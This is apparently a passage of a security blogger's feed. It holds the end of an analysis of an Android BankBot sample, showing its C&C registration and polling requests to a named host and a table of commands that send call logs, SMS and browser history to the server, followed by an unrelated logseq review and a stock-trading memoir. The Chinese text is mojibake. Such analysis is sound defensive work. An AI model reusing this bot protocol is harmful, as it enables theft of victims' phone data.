class="operator">=</span> <span class="string">&quot;data&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_HISTORY</span> <span class="operator">=</span> <span class="string">&quot;browser_history&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_ID</span> <span class="operator">=</span> <span class="string">&quot;id&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_IMEI</span> <span class="operator">=</span> <span class="string">&quot;imei&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_INTERCEPT</span> <span class="operator">=</span> <span class="string">&quot;intercept&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_MAYHEM</span> <span class="operator">=</span> <span class="string">&quot;mayhem&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_MESSAGE</span> <span class="operator">=</span> <span class="string">&quot;prefix_1&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_NEW_SERVER</span> <span class="operator">=</span> <span class="string">&quot;server&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_NUMBER_SEND_TO</span> <span class="operator">=</span> <span class="string">&quot;number_1&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_OPERATOR</span> <span class="operator">=</span> <span class="string">&quot;op&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_PHONE</span> <span class="operator">=</span> <span class="string">&quot;phone&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_POLL_INTERVAL</span> <span class="operator">=</span> <span class="string">&quot;server_poll&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;prefix&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_REPORT_CALLS</span> <span class="operator">=</span> <span class="string">&quot;calls&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_SMS_HISTORY</span> <span class="operator">=</span> <span class="string">&quot;sms_history&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_SPAM</span> <span class="operator">=</span> <span class="string">&quot;text_2&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_STATUS</span> <span class="operator">=</span> <span class="string">&quot;status&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_URL_TO_SHOW</span> <span class="operator">=</span> <span class="string">&quot;url&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_VERSION</span> <span class="operator">=</span> <span class="string">&quot;version&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="è¯·æ±‚æ³¨å†Œ"><a href="#è¯·æ±‚æ³¨å†Œ" class="headerlink" title="è¯·æ±‚æ³¨å†Œ"></a>è¯·æ±‚æ³¨å†Œ</h3><p>è¿”å›æŠ¥æ–‡</p><p>401</p><h3 id="æ³¨å†ŒæŠ¥æ–‡"><a href="#æ³¨å†ŒæŠ¥æ–‡" class="headerlink" title="æ³¨å†ŒæŠ¥æ–‡"></a>æ³¨å†ŒæŠ¥æ–‡</h3><p>è¯·æ±‚æŠ¥æ–‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /p/gate.php HTTP/1.1</span><br><span class="line">Content-Length: 106</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: quick-sshopping.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">action=reg&amp;imei=098767899076562&amp;phone=15802920457&amp;op=Android&amp;version=4.4.4%2C3.4.0-gd853d22&amp;prefix=12Jhw21</span><br></pre></td></tr></table></figure><p>å“åº”æŠ¥æ–‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.8.0</span><br><span class="line">Date: Tue, 23 Feb 2016 07:25:21 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/5.5.31</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">200</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è·å–å‘½ä»¤"><a href="#è·å–å‘½ä»¤" class="headerlink" title="è·å–å‘½ä»¤"></a>è·å–å‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /p/gate.php HTTP/1.1</span><br><span class="line">Content-Length: 32</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: quick-sshopping.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">action=poll&amp;imei=098767899076562</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.8.0</span><br><span class="line">Date: Tue, 23 Feb 2016 07:25:30 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/5.5.31</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿”å›çš„å‘½ä»¤ä¸ºjson æ ¼å¼ï¼Œä¸»è¦çš„æŒ‡ä»¤æœ‰ä¸‹é¢å‡ ä¸ªï¼Œ</p><table><thead><tr><th>æŒ‡ä»¤</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>401</td><td>è¦æ±‚ bot æ³¨å†Œ</td></tr><tr><td>call_log</td><td>è·å–ç”µè¯è®°å½•, å‘é€åˆ°C&amp;C server</td></tr><tr><td>sms_history</td><td>è·å–çŸ­ä¿¡å†…å®¹ï¼Œå‘é€åˆ°C&amp;C server</td></tr><tr><td>browser_history</td><td>è·å–æµè§ˆå™¨ä¹¦ç­¾ï¼Œå‘é€åˆ°C&amp;C server</td></tr><tr><td>url</td><td>è®¿é—®url é“¾æ¥</td></tr><tr><td>server</td><td>æ›´æ¢C&amp;C server</td></tr><tr><td>intercept</td><td></td></tr><tr><td>server_poll</td><td>æ›´æ–°ä»æœåŠ¡å™¨è·å–å‘½ä»¤çš„æ—¶é—´é—´éš”</td></tr><tr><td>mayhem</td><td></td></tr><tr><td>calls</td><td></td></tr></tbody></table><p>ç›‘è§†æœåŠ¡äº†å¤§åŠå¤©ï¼Œæ²¡æœ‰æ”¶åˆ°æœ‰æ•ˆæŒ‡ä»¤ï¼Œçœ‹æ¥ä¸æ˜¯ç‰¹åˆ«æ´»è·ƒã€‚</p><h2 id="0x03æ¸…é™¤"><a href="#0x03æ¸…é™¤" class="headerlink" title="0x03æ¸…é™¤"></a>0x03æ¸…é™¤</h2><p>è¿™ä¸ªAppçš„æ¸…é™¤éå¸¸è´¹åŠ²ï¼ŒåŸå› å°±æ˜¯æ³¨å†Œä¸ºè®¾å¤‡ç®¡ç†å™¨çš„appä¸èƒ½å¸è½½ï¼Œè€Œè¿™ä¸ªAppåˆä½¿è¯ˆ<br>ä¸è®©æˆ‘ä»¬å–æ¶ˆè®¾å¤‡ç®¡ç†å™¨ï¼Œä¼°è®¡åªæœ‰rootçš„æœºå™¨ä¼šå¥½å¤„ç†ä¸€äº›ã€‚</p><h2 id="0x04æ€»ç»“"><a href="#0x04æ€»ç»“" class="headerlink" title="0x04æ€»ç»“"></a>0x04æ€»ç»“</h2><p>BankBot æ ·æœ¬ï¼Œä»£ç ç¼–å†™çš„ç›¸å½“è§„èŒƒï¼Œé£æ ¼ä¸¥è°¨ï¼Œæ˜¯æ­£è§„ç¨‹åºå‘˜çš„ä½œå“ã€‚ä½†è¡Œä¸ºéå¸¸æµæ°“ï¼Œ<br>å¾ˆé¡½å›ºï¼Œä¸å®¹æ˜“æ¸…é™¤ã€‚æ‰€ä»¥é‡åˆ°ç”³è¯·device admin æƒé™çš„ç¨‹åºä¸€å®šè¦å°å¿ƒè°¨æ…ï¼Œä»¥å…ä¸è‰¯<br>åæœã€‚è€ŒAndroidçš„ç•Œé¢åŠ«æŒä¹Ÿæ˜¯ä¸€ä¸ªä¸¥é‡çš„é—®é¢˜ï¼Œä¼°è®¡åç»­åˆ©ç”¨è¿™äº›æŠ€æœ¯çš„æ¶æ„Appçš„æ•°é‡<br>ä¼šè¶Šæ¥è¶Šå¤šã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-æ ·æœ¬æ¦‚å†µ&quot;&gt;&lt;a href=&quot;#0x00-æ ·æœ¬æ¦‚å†µ&quot; class=&quot;headerlink&quot; title=&quot;0x00 æ ·æœ¬æ¦‚å†µ&quot;&gt;&lt;/a&gt;0x00 æ ·æœ¬æ¦‚å†µ&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;å­—æ®µ&lt;/th&gt;
&lt;th&gt;å†…å®¹&lt;/th&gt;
</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
    <category term="Malware" scheme="http://usmacd.com/tags/Malware/"/>
    
  </entry>
  
  <entry>
    <title>logseq è¯•ç”¨æŠ¥å‘Š</title>
    <link href="http://usmacd.com/2022/02/21/logseq/"/>
    <id>http://usmacd.com/2022/02/21/logseq/</id>
    <published>2022-02-20T16:00:00.000Z</published>
    <updated>2022-02-20T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åŒé“¾ç¬”è®°çš„æ¦‚å¿µæ¯”è¾ƒç«çƒ­ï¼Œ Roam Research å¤§æ¦‚æ˜¯ç¬¬ä¸€ä¸ªå®ç°æ­¤åŠŸèƒ½çš„è½¯ä»¶ï¼Œåç»­ Notionã€Obsidianã€logseq ç­‰è½¯ä»¶å¤§æ­¥è·Ÿè¿›ï¼Œè¿™äº›è½¯ä»¶å„æœ‰åƒç§‹ã€‚ä¸‹é¢è¿™æ®µæ˜¯å‚è€ƒèµ„æ–™æ–‡ç« ä¸­çš„ä¸€å°æ®µï¼Œå¾ˆæœ‰å‚è€ƒæ„ä¹‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Roam çš„çªç ´åœ¨äºï¼Œç†è®ºä¸Šï¼ŒæŠŠè½¯ä»¶è®¾è®¡ç†å¿µä¸å¡ç‰‡ç›’ç¬”è®°æ³•ç´§ç´§æ†ç»‘ï¼š</span><br><span class="line">å¢æ›¼ï¼ˆNiklas Luhmannï¼‰å¾—ç›Šäºå¡ç‰‡ç›’ç¬”è®°æ³•ï¼Œä»å…¬åŠ¡å‘˜æˆä¸ºå¾·å›½å½“ä»£é‡è¦çš„ç¤¾ä¼šå­¦å®¶ï¼Œ</span><br><span class="line">å› æ­¤åŸºäºå¡ç‰‡ç›’ç¬”è®°æ³•çš„ Roam ä¹Ÿå¯ä»¥åŠ©åŠ›ä½ çš„æˆåŠŸï¼›</span><br><span class="line">æŠ€æœ¯ä¸Šï¼Œæ¨å‡ºåŒå‘é“¾æ¥ã€å¯è§†åŒ–ç¬”è®°é—´çš„è”ç³»ã€åµŒå…¥ï¼ˆTransclusionï¼‰ç­‰åŠŸèƒ½ï¼Œ</span><br><span class="line">è®©ç”Ÿäº§ã€æŸ¥æ‰¾ç¬”è®°æ›´åŠ é«˜æ•ˆï¼Œäºæ­¤åŒæ—¶ï¼Œè¿˜çœå´ç»´æŠ¤å±‚çº§ç»“æ„çš„éº»çƒ¦ã€‚</span><br></pre></td></tr></table></figure><p><img src="https://github.com/henices/pictures/raw/master/logseq0.jpg"><br><img src="https://github.com/henices/pictures/raw/master/logseq1.png"></p><p>ä¸Šé¢ä¸¤å¼ å›¾ç‰‡å°±æ˜¯<strong>å¡ç‰‡ç›’ç¬”è®°æ³•</strong> æœ€å½¢è±¡çš„è¡¨ç¤ºäº†ï¼Œä¸ªäººè§‰å¾—è¿™ç§æ–¹æ³•å¾ˆé€‚åˆè‡ªå·±ã€‚</p><p>ä¸ºäº†ä½“éªŒåŒé“¾ç¬”è®°ï¼Œæˆ‘èŠ±è´¹äº†ä¸å°‘æ—¶é—´ï¼Œä¸Šé¢çš„å‡ ä¸ªè½¯ä»¶éƒ½ä½“éªŒäº†ä¸€ä¸‹ï¼ŒRoam æ˜¯æ”¶è´¹è½¯ä»¶ï¼Œé“¶å­ä¸å¤Ÿæ‰€ä»¥ä¸é€‰ï¼ŒNotion ç¬”è®°å­˜å‚¨åœ¨äº‘ç«¯ï¼Œä¸ç¬¦åˆæˆ‘æ•°æ®å®‰å…¨çš„è¦æ±‚ä¹Ÿä¸é€‰ï¼Œå‰©ä¸‹çš„å°±åªæœ‰ä¸¤ä¸ªé€‰é¡¹äº† Obsidian å’Œ logseq ã€‚</p><h2 id="Obsidian"><a href="#Obsidian" class="headerlink" title="Obsidian"></a>Obsidian</h2><p>è½¯ä»¶ä¸»é¡µï¼š<a href="https://obsidian.md/">https://obsidian.md/</a><br><img src="https://github.com/henices/pictures/raw/master/logseq2.png"></p><p>æŒºå¤šäººé€‰æ‹©ç”¨ Obsidian çš„åŸå› æ˜¯å®ƒçš„ MarkDown è¯­æ³•æ”¯æŒå¾—æ¯”è¾ƒå¥½ï¼ŒMarkDown è¯­æ³•æœ‰å¾ˆå¤šçš„ä½¿ç”¨è€…ï¼Œç±»ä¼¼ Typora çš„ MarkDown ç¬”è®°è½¯ä»¶æ˜¯å½“å‰ç¬”è®°è½¯ä»¶çš„ä¸»æµï¼Œè¿™ä½¿å¾—è¿™äº›ç¬”è®°è½¯ä»¶çš„ä½¿ç”¨è€…è¿‡æ¸¡åˆ° obsidian ä¼šæ¯”è¾ƒå¹³æ»‘ã€‚æˆ‘æ˜¯å¼€æºMarkDown ç¬”è®°è½¯ä»¶ Vnote çš„é‡åº¦ä½¿ç”¨è€…ï¼Œä¸€åº¦æƒ³ä½¿ç”¨ Obsidian ä½œä¸ºä¸»åŠ›è½¯ä»¶ã€‚</p><p>Obsidian æœ‰æŒºå¤šä¼˜ç‚¹ï¼Œæ¯”å¦‚å®ƒå¯¹ä¸ªäººç”¨æˆ·æ°¸ä¹…å…è´¹ï¼Œä½†æ˜¯å®ƒä¸å¼€æºï¼Œè€Œä¸” <a href="https://help.obsidian.md/How+to/Link+to+blocks">Link+to+blocks</a> çš„è¯­æ³•æ¯”è¾ƒåˆ«æ‰­ã€‚æœ€ç»ˆè¿˜æ˜¯æ²¡æœ‰é€‰æ‹©å®ƒï¼Œæœ‰äººè¯´Obsidian æ’ä»¶éå¸¸ä¸°å¯Œï¼Œæˆ‘è‡ªå·±æ²¡æœ‰æŠ˜è…¾è¿‡ã€‚</p><h2 id="logseq"><a href="#logseq" class="headerlink" title="logseq"></a>logseq</h2><p>è½¯ä»¶ä¸»é¡µï¼š<a href="https://logseq.com/">https://logseq.com/</a><br>æºç ä»“åº“ï¼š<a href="https://github.com/logseq/logseq">https://github.com/logseq/logseq</a></p><p><img src="https://github.com/henices/pictures/raw/master/logseq3.png"></p><p>è¯´äº†è¿™ä¹ˆä¹…ç»ˆäºåˆ°æ­£ä¸»äº†ï¼Œç¬¬ä¸€æ¬¡çŸ¥é“åŒé“¾ç¬”è®°è¿™ä¸ªæ¦‚å¿µæ˜¯å› ä¸ºæœ‰ä¸ªç½‘å‹åœ¨ç½‘ä¸Šè¯´ä½¿ç”¨æ•ˆæœä¸é”™ï¼Œè¿‡æ¸¡å¾ˆå¹³æ»‘ã€‚å¯èƒ½æœ‰å…ˆå…¥ä¸ºä¸»çš„å…³ç³»ï¼Œå¦å¤–æˆ‘æœ¬äººå¯¹å¼€æºè½¯ä»¶ä¸€å‘æœ‰è«åçš„å¥½æ„Ÿï¼Œæ‰€ä»¥ä¸»è§‚æ„è¯†ä¸Šå°±å¾ˆå–œæ¬¢è¿™ä¸ªè½¯ä»¶ã€‚logseq çš„ç²’åº¦è¶³å¤Ÿï¼Œblock reference ä½¿ç”¨éå¸¸æ–¹ä¾¿ï¼Œå¦å¤– logseq çš„ PDF æ ‡è®°åŠŸèƒ½å¯¹äºéœ€è¦å¤§é‡é˜…è¯»è®ºæ–‡çš„æˆ‘æ¥è¯´éå¸¸å¥½ç”¨ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq4.png"></p><p>ä½†æ˜¯ logseq ä¹Ÿä¸æ˜¯æ²¡æœ‰ç¼ºç‚¹ï¼Œlogseq å¯¹ markdown è¯­æ³•çš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œå³ä½¿ç›´æ¥å¯¼å…¥ MarkDown æ–‡ä»¶ï¼Œæœ€åæ˜¾ç¤ºçš„ç»“æœæ„Ÿè§‰ä¹Ÿæ˜¯æœ‰é—®é¢˜ï¼Œå„ç±»æ ‡é¢˜ç›´æ¥è½¬åŒ–æˆ block äº†ï¼Œè¿™æ˜¯æœ‰é—®é¢˜çš„ã€‚ä½†æ˜¯ä»è¿™ä¸ªè§’åº¦è¯´ logseq å°±æ˜¯ä¸€ä¸ªçº¯ç²¹çš„åŒé“¾ç¬”è®°è½¯ä»¶è€Œä¸æ˜¯ä¸€ä¸ªæ·»åŠ äº†åŒé“¾åŠŸèƒ½çš„ MarkDown ç¬”è®°è½¯ä»¶ã€‚</p><h2 id="æœ€ç»ˆçš„ç¬”è®°ç®¡ç†æ–¹æ³•"><a href="#æœ€ç»ˆçš„ç¬”è®°ç®¡ç†æ–¹æ³•" class="headerlink" title="æœ€ç»ˆçš„ç¬”è®°ç®¡ç†æ–¹æ³•"></a>æœ€ç»ˆçš„ç¬”è®°ç®¡ç†æ–¹æ³•</h2><p>è¯´åˆ°è¿™ï¼Œé—®é¢˜å°±ç®€åŒ–äº†ï¼Œå¹³æ—¶çš„æ–‡æ¡£è®°å½•ä»ç„¶ä½¿ç”¨ MarkDown ç¬”è®°è½¯ä»¶ï¼Œåªæ˜¯åœ¨å¹³æ—¶è®°å½•çš„æ—¶å€™ä½¿ç”¨åŒé“¾ç¬”è®°è½¯ä»¶ã€‚è¿™æ ·çš„ç¬”è®°ç®¡ç†æ–¹æ³•çœ‹ä¸Šå»æ¯”è¾ƒéº»çƒ¦ï¼Œå…¶å®å´å¾ˆå®Œç¾ï¼Œæƒ³å†™æ–‡ç« çš„æ—¶å€™ç›´æ¥ç”¨ VNoteï¼Œå¹³æ—¶çŸ¥è¯†ç§¯ç´¯è®°å½•çš„æ—¶å€™å°±ç”¨ logseqï¼Œæ ¹æœ¬å°±ä¸ç”¨è¿‡æ¸¡ï¼Œåªéœ€è¦å¯ç”¨ä¸€ä¸ªæ–°è½¯ä»¶å³å¯ã€‚</p><p>åŸºäº block çš„åŒé“¾ç¬”è®°æœ€å¤§çš„å¥½å¤„å°±æ˜¯æ²¡æœ‰è¾“å‡ºè´Ÿæ‹…ï¼Œä¸€äº›å¾ˆéšæ„çš„æƒ³æ³•éƒ½å¯ä»¥è®°å½•ä¸‹æ¥ï¼Œå› ä¸ºå¤§å®¶ç¡®å®ä¸å¯èƒ½æ¯æ¬¡éƒ½æœ‰å¤§æ®µçš„æƒ³æ³•å¯ä»¥è¾“å‡ºã€‚æœ‰äººè¯´ç”¨ logseqä¸€å¹´å†™äº† 30ä¸‡å­—ï¼Œæˆ‘å¼€å§‹è§‰å¾—æœ‰ç‚¹å¤¸å¼ ï¼Œä½†æ˜¯ä½¿ç”¨ä¸€ä¸ªå¤šæœˆå‘ç°å¯èƒ½å±å®ï¼Œç°åœ¨æˆ‘è‡ªå·±éƒ½å†™äº†å‡ ä¸‡å­—äº†ã€‚æ¯ä¸ªæƒ³æ³• (block) ä¹‹é—´å¯èƒ½ä¼šæœ‰è”ç³»ï¼Œä¸æ–­è®°å½•æƒ³æ³•ï¼Œä¸æ–­è”ç³»ï¼Œæ…¢æ…¢çš„çœŸèƒ½å‘ç°ä¸€äº›æ„æƒ³ä¸åˆ°çš„ä¸œè¥¿ä¹‹é—´å±…ç„¶æœ‰è”ç³»ï¼Œè€Œè¿™äº›è”ç³»å¾ˆæœ‰å¯èƒ½æ˜¯ä¸€äº›å…³é”®çš„åº•å±‚é€»è¾‘ã€‚å¹³æ—¶åœ¨è®°å½•çš„æ—¶å€™æ‰‹å·¥åˆ’åˆ†ç›®å½•ï¼Œå±‚æ¬¡å…³ç³»ï¼Œå…¶å®å·²ç»å°†ä¸€äº›æƒ³æ³•ï¼Œæ¦‚å¿µç»™é€»è¾‘åŒ–äº†ï¼Œè¿™æ ·çš„è®°å½•æ–¹æ³•å¾ˆéš¾æ‘†è„±å›ºæœ‰çš„è®¤çŸ¥ï¼Œè€ŒåŸºäº block çš„åŒé“¾ç¬”è®°å°±è‡ªç”±çš„å¤šï¼Œä¸æ–­è®°å½•ï¼Œä¸æ–­æ•´ç†ï¼Œæ±‡æ€»å°±äº¤ç»™è½¯ä»¶æ¥å®Œæˆå§ã€‚</p><p>æˆ‘ç°åœ¨å·²ç»é€šè¿‡ logseq çš„è®°å½•æƒ³æ¸…æ¥šäº†ä¸€äº›é—®é¢˜ï¼Œåœ¨å¹³æ—¶çš„å·¥ä½œè®°å½•ä¸­ä¹Ÿä¸æ–­åœ°ç¨³æ­¥èºæ—‹æ¨è¿›ï¼Œåœ¨æ­¤å‘å¤§å®¶æ¨èè¿™æ¬¾ç¬”è®°è½¯ä»¶ã€‚</p><h2 id="æœ€åçš„è¯"><a href="#æœ€åçš„è¯" class="headerlink" title="æœ€åçš„è¯"></a>æœ€åçš„è¯</h2><p>å…¶å®å·¥å…·å¹¶ä¸æ˜¯é‚£ä¹ˆé‡è¦ï¼Œæœ€é‡è¦çš„è¿˜æ˜¯å¹³æ—¶è¦è®°å½•ï¼Œè¦å®šæœŸè¾“å‡ºã€‚IT ç•Œæœ‰ä¸€ä¸ªè‘—åçš„æ®µå­ï¼Œä½ ä»¥ä¸ºä½ æ˜¯åœ¨å†™ blog å…¶å®ä½ åªæ˜¯åœ¨æŠ˜è…¾ wordpress ï¼šï¼‰</p><p>å…±å‹‰ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://sspai.com/post/69503">åŒé“¾ç¬”è®°è½¯ä»¶æ¨èï¼šLogseq å’Œå®ƒçš„äº”ç§ç”¨æ³•</a><br><a href="https://sspai.com/post/65273">è¯·ä¸è¦ç¥åŒ–åŒé“¾ç¬”è®°</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ€è¿‘åŒé“¾ç¬”è®°çš„æ¦‚å¿µæ¯”è¾ƒç«çƒ­ï¼Œ Roam Research å¤§æ¦‚æ˜¯ç¬¬ä¸€ä¸ªå®ç°æ­¤åŠŸèƒ½çš„è½¯ä»¶ï¼Œåç»­ Notionã€Obsidianã€logseq ç­‰è½¯ä»¶å¤§æ­¥è·Ÿè¿›ï¼Œè¿™äº›è½¯ä»¶å„æœ‰åƒç§‹ã€‚ä¸‹é¢è¿™æ®µæ˜¯å‚è€ƒèµ„æ–™æ–‡ç« ä¸­çš„ä¸€å°æ®µï¼Œå¾ˆæœ‰å‚è€ƒæ„ä¹‰ï¼š&lt;/p&gt;
&lt;figure class=&quot;highli</summary>
      
    
    
    
    
    <category term="Software" scheme="http://usmacd.com/tags/Software/"/>
    
  </entry>
  
  <entry>
    <title>ä¸ªäººç‚’è‚¡ç»å†</title>
    <link href="http://usmacd.com/2021/12/24/stock_experience/"/>
    <id>http://usmacd.com/2021/12/24/stock_experience/</id>
    <published>2021-12-24T05:20:40.690Z</published>
    <updated>2021-12-24T05:20:40.690Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬äººITç”·ä¸€æšï¼Œ2015å¹´å…¥å¸‚ï¼Œåˆ°ä»Šå¤©5å¹´å¤šäº†ï¼Œæ‰€å¹¸è¿˜åœ¨åƒäººä¸éœ²éª¨å¤´çš„å¸‚åœºä¸Šæ´»ç€ï¼Œä¹Ÿæ˜¯éå¸¸ä¸å®¹æ˜“ã€‚åŸºæœ¬ä¸å­˜åœ¨ä»€ä¹ˆç‰¹æ®Šæƒ…å†µï¼ŒéŸ­èœæ€»æ˜¯åœ¨äººå£°é¼æ²¸çš„ç‰›å¸‚é«˜ç‚¹å…¥åœºï¼Œæœ¬äººä¹Ÿä¸ä¾‹å¤–ï¼Œä¸Šè¯3500å¤šç‚¹å…¥å¸‚ï¼Œä¸Šè¯3800å¤šç‚¹è®©åª³å¦‡ä¹°äº†æ²ªæ·± 300 åŸºé‡‘ ï¼ˆä¸æ˜¯ETFï¼‰ï¼Œè¿™åŸºé‡‘ä»Šå¹´æ‰è§£å¥—ï¼Œå°èµšå‡ºå±€äº†ã€‚</p><p>è¿æ°”å¥½çš„æ˜¯ï¼Œ2015å¹´çš„æ—¶å€™ä¸­äº†ä¸€æ”¯æ–°è‚¡ï¼Œæ–°è‚¡çš„æ”¶ç›Šå¯¹å†²äº†å€’é‡‘å­—å¡”åŠ ä»“çš„å›æ’¤ï¼Œå°èµš1ä¸‡å…ƒå‡ºå±€æ¸…äº†ä»“ï¼Œæœ‰æ—¶å€™æˆ‘ä¹Ÿåœ¨æƒ³å¦‚æœä¸æ˜¯è¿™èµšäº†1ä¸‡ï¼Œæ˜¯ä¸æ˜¯ä¹Ÿå°±ä¸ä¼šç»§ç»­ç‚’è‚¡äº†ã€‚æ¥ä¸‹æ¥çš„äº‹æƒ…å¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰äº†ï¼Œç†”æ–­å’Œè‚¡ç¾3.0ï¼Œä¸€ç›´åœ¨ä¸èµšå’Œå°äºä¸­æŒ£æ‰ç€ï¼Œå±…ç„¶ä¹ŸåšæŒäº†ä¸‹æ¥ã€‚ç†å·¥ç”·çš„ç‰¹è´¨æ•‘äº†æˆ‘ï¼Œä»2015å¹´å¼€å§‹è®¤çœŸå­¦ä¹ è‚¡ç¥¨æ“ä½œï¼Œæ¶è¡¥åŸºç¡€çŸ¥è¯†ï¼Œåˆ†æ—¶ï¼ŒKçº¿ï¼Œç¼ºå£ï¼Œä»·é‡å…³ç³»ï¼Œç¼ è®ºï¼Œæ³¢æµªç†è®ºï¼Œç®±ä½“ç†è®ºï¼Œè¶‹åŠ¿äº¤æ˜“ï¼Œä»·å€¼æŠ•èµ„ï¼ŒåŸºæœ¬å„ç§ç†è®ºéƒ½çœ‹äº†éï¼Œå…¶å®åˆ°æœ€åå‘ç°æœ‰ç”¨çš„ä¸œè¥¿å¤ªå°‘äº†ï¼Œå…³äºè‚¡ç¥¨çš„ä¹¦ä¹ŸåŸºæœ¬æ²¡å•¥ç”¨ï¼ŒçœŸæ­£æœ‰ç”¨çš„ä¹¦å¯èƒ½å°±é‚£ä¹ˆå‡ æœ¬ï¼Œå¯æ˜¯å¦‚æœä¸çœ‹å‡ åæœ¬çš„è¯ï¼Œä½ æ€ä¹ˆçŸ¥é“å“ªå‡ 